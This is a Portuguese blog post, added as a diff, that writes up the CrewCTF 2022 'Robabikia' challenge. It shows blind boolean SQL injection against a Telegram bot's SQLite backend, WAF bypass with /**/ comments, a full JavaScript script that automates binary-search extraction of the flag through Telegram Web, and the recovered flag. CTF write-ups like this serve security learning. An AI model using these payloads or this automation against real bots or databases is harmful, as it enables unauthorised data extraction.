@@ -1,0 +1,178 @@
+---
+layout: post
+title: "CrewCTF 2022: Robabikia — Write-Up"
+data: "17/04/2022"
+excerpts: "Resolução do desafio de web do CrewCTF: Robabikia"
+keywords: "crewctf, robabikia, writeup, ctftime"
+type: "article"
+card: "/assets/images/crewctf-2022-robabikia/image.png"
+---
+<div class="col-12 col-sm-12 col-md-12 col-lg-4 col-xl-4 mb-3">
+  <div class="list-group" id="list-tab">
+    <a class="list-group-item list-group-item-action bg-dark text-white" href="#robabikia">CrewCTF 2022 — Robabikia</a>
+    <a class="list-group-item list-group-item-action bg-dark text-white" href="#references">Fontes</a>
+  </div>
+</div>
+<div class="col-12 col-sm-12 col-md-12 col-lg-6 col-xl-6 mb-3">
+  <div data-bs-spy="scroll" data-bs-target="#list-tab" data-bs-offset="0" class="scrollspy-example" tabindex="0">
+    <section>
+      <h1 class="fw-bold" id="robabikia">CrewCTF 2022 — Robabikia</h1>
+      <p>Esta é uma resolução do desafio Robabikia.</p>
+      <p>A descrição do desafio disponibilizava um bot no Telegram: <a href="https://t.me/crewctf_Robabikia_bot">@crewctf_Robabikia_bot</a></p>
+      <p>Abrindo o chat do bot, tem-se a seguinte mensagem com os comandos do bot:</p>
+      <figure class="figure">
+        <img src="{{ "/assets/images/crewctf-2022-robabikia/1.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
+        <figcaption class="figure-caption text-center fw-bold fst-italic">Mensagem help do bot</figcaption>
+      </figure>
+      <br />
+      <br />
+      <p>O comando /items listava todos os itens:</p>
+      <figure class="figure">
+        <img src="{{ "/assets/images/crewctf-2022-robabikia/2.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
+        <figcaption class="figure-caption text-center fw-bold fst-italic">Lista dos itens</figcaption>
+      </figure>
+      <br />
+      <br />
+      <p>O comando /price apenas retornava os preços dos itens. E o /desc dava um breve descrição do item:</p>
+      <figure class="figure">
+        <img src="{{ "/assets/images/crewctf-2022-robabikia/3.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
+        <figcaption class="figure-caption text-center fw-bold fst-italic">Descrição de um item</figcaption>
+      </figure>
+      <br />
+      <br />
+      <p>Enquanto o comando /value estava desativado:</p>
+      <figure class="figure">
+        <img src="{{ "/assets/images/crewctf-2022-robabikia/4.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
+        <figcaption class="figure-caption text-center fw-bold fst-italic">Comando /value desativado</figcaption>
+      </figure>
+      <p>Testando o comando /desc descobri um possível sql injection:</p>
+      <figure class="figure">
+        <img src="{{ "/assets/images/crewctf-2022-robabikia/5.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
+        <figcaption class="figure-caption text-center fw-bold fst-italic">Possível sql injection</figcaption>
+      </figure>
+      <p>Para extrair as informações corretas era necessário estar atento as mensagens de resposta do bot: a query enviada era true quando o bot retornava "Old TV to your watch your favorite series" (para o item 3) e false quando o bot retornava "Item not found".</p>
+      <p>Após algumas tentativas descobri que era um SQLite e que tinha um WAF por trás da aplicação. Então um membro do meu time, o valent1ne, descobriu que usando /**/ dava o bypass necessário.</p>
+      <p>Logo, tentamos extrair o número de tabelas e o tamanho do nome delas:</p>
+      <figure class="figure">
+        <img src="{{ "/assets/images/crewctf-2022-robabikia/6.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
+        <figcaption class="figure-caption text-center fw-bold fst-italic">Número de tabelas e tamanho do nome da tabela</figcaption>
+      </figure>
+      <br />
+      <br />
+      <p>Extraindo o nome da tabela:</p>
+      <figure class="figure">
+        <img src="{{ "/assets/images/crewctf-2022-robabikia/7.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
+        <figcaption class="figure-caption text-center fw-bold fst-italic">Nome da tabela</figcaption>
+      </figure>
+      <br />
+      <br />
+      <p>O nome da tabela é items :)</p>
+      <p>Vasculhando as colunas da tabela, verifiquei que existia uma coluna chamada value, que por sua vez é o mesmo nome do comando desabilitado. E foi aí que eu estranhei. Seguindo a extração de dados dessa coluna, encontrei uma row com as iniciais iguais ao do formato da flag "crew{":</p>
+      <figure class="figure">
+        <img src="{{ "/assets/images/crewctf-2022-robabikia/8.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
+        <figcaption class="figure-caption text-center fw-bold fst-italic">Extraindo as iniciais da flag</figcaption>
+      </figure>
+      <br />
+      <br />
+      <p>E fui descobrir o tamanho do conteúdo dessa linha:</p>
+      <figure class="figure">
+        <img src="{{ "/assets/images/crewctf-2022-robabikia/9.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
+        <figcaption class="figure-caption text-center fw-bold fst-italic">Procurando o tamanho da flag</figcaption>
+      </figure>
+      <br />
+      <br />
+      <p>A flag tinha 47 caracteres para a minha tristeza.</p>
+      <p>Fazer a extração da flag manualmente era inviável, então eu optei por escrever algo para automatizar o processo. Lembrei de um script em Javascript que o Foucan tinha enviado, que spammava o Script do filme Shrek no Whatsapp e usei ele como base para escrever o código de pegar a flag.</p>
+      <p>Ao fazer o código, tive que trocar para a versão do Telegram Web para a versão K, porque por algum motivo ela travava menos.</p>
+      <p>Fiz o código, mas não era rápido o suficiente, além de extrapolar o rate limit do Telegram em alguns momentos. Por fim, resolvi implementar uma espécie de pesquisa binária lendo as mensagens de resposta do bot.</p>
+      <p>Para ler tais mensagens pensei em usar o timestamp que vinha nas tags html, porém o valent1ne me deu uma forma melhor:</p>
+      <pre>document.getElementsByClassName("message")</pre>
+      <p>Então, o código ficou assim:</p>
+      <pre>
+const keyboardEvent = new KeyboardEvent('keydown', {
+    code: 'Enter',
+    key: 'Enter',
+    charCode: 13,
+    keyCode: 13,
+    view: window,
+    bubbles: true
+});
+
+async function sendPayload(){
+	main = document.querySelector(".chat-input-container");
+	textarea = document.querySelector(`div[contenteditable="true"]`);
+
+	flag = "crew{";
+	flagArray = [];
+	for(let j = 6; j <= 47; j++){
+		i = 21;
+		end = 127;
+		while(i <= end){
+			divisao = Math.floor((end - i)/2);
+			mid = i + divisao
+			textarea.textContent = "/desc 3'/* */and/* */(SELECT/* */unicode(substr(value," + j + ",1))/* */FROM/* */items/* */limit/* */5/* */offset/* */4)=" + mid +" -- -";
+			textarea.dispatchEvent(keyboardEvent);
+
+			await new Promise(resolve => setTimeout(resolve, 1000));
+			messagesNumber = document.getElementsByClassName("message").length;
+			messageText = document.getElementsByClassName("message")[messagesNumber-1].innerText;
+
+			if(messageText.includes("Old")){
+				flagArray.push(mid);
+				flag += String.fromCharCode(mid);
+				break;
+			} else {
+				await new Promise(resolve => setTimeout(resolve, 1000));
+
+				textarea.textContent = "/desc 3'/* */and/* */(SELECT/* */unicode(substr(value," + j + ",1))/* */FROM/* */items/* */limit/* */5/* */offset/* */4)<" + mid +" -- -";
+				textarea.dispatchEvent(keyboardEvent);
+
+				await new Promise(resolve => setTimeout(resolve, 1000));
+				messagesNumber = document.getElementsByClassName("message").length;
+				messageText = document.getElementsByClassName("message")[messagesNumber-1].innerText;
+
+				if(messageText.includes("Old")){
+					end = mid-1;
+				} else {
+					await new Promise(resolve => setTimeout(resolve, 1000));
+
+					textarea.textContent = "/desc 3'/* */and/* */(SELECT/* */unicode(substr(value," + j + ",1))/* */FROM/* */items/* */limit/* */5/* */offset/* */4)>" + mid +" -- -";
+					textarea.dispatchEvent(keyboardEvent);
+
+					await new Promise(resolve => setTimeout(resolve, 1000));
+					messagesNumber = document.getElementsByClassName("message").length;
+					messageText = document.getElementsByClassName("message")[messagesNumber-1].innerText;
+
+					if(messageText.includes("Old")){
+						i = mid+1;
+					}
+				}
+			}
+
+			await new Promise(resolve => setTimeout(resolve, 5000));
+		}
+		console.log(flagArray);
+		console.log(flag);
+	}
+}
+      </pre>
+      <p>A função keyboardEvent é apenas para simular a utilização da tecla Enter.</p>
+      <p>Optei por usar a função unicode do SQLite, porque achei mais fácil trabalhar diretamente com números.</p>
+      <p>O script acima tem esse flow:</p>
+      <p>O script acha o meio (mid) dos valores iniciais (i) e finais (end), e verifica se o código unicode daquele caracter da flag é igual ao mid. Se for, adiciona o caracter na variável flag. Caso contrário, o script verifica se o código unicode é menor que o mid, se for, o final (end) se torna mid-1. Caso contrário, o início (i) se torna mid+1.</p>
+      <p>Obs: adicionei alguns setTimeout() para dar tempo de o bot responder e evitar tomar block por causa do rate limit.</p>
+      <p>Quando terminei o código faltava menos de 40 minutos para o fim do CTF e acabou que não consegui pontuar a tempo, mas consegui obter flag:</p>
+      <figure class="figure">
+        <img src="{{ "/assets/images/crewctf-2022-robabikia/10.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
+        <figcaption class="figure-caption text-center fw-bold fst-italic">FLAG</figcaption>
+      </figure>
+      <p>Obs: durante a execução do programa, o browser travou e acabou não salvando o caracter da posição 32 da flag, mas utilizando essa query descobrimos que o caracter correto é 1:</p>
+      <pre>/desc 3'/* */and/* */(SELECT/* */unicode(substr(value,32,1))/* */FROM/* */items/* */limit/* */5/* */offset/* */4)=49 -- -</pre>
+      <p>Flag: <pre>crew{U53_fa57_WAY-1kJ5QL_1nj3C710N_1N_t3l3_B0t}</pre></p>
+      <h4 class="fw-bold" id="references">Fontes:</h4>
+      <p><a class="btn btn-dark text-white" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">PayloadsAllTheThings/SQLite Injection.md</a></p>
+      <p><a class="btn btn-dark text-white" href="https://github.com/Matt-Fontes/SendScriptWhatsApp">Script para enviar o Roteiro do filme Shrek</a></p>
+      <p><a class="btn btn-dark text-white" href="https://www.geeksforgeeks.org/binary-search/">Binary Search - GeeksforGeeks</a></p>
+    </section>
+  </div>
+</div>
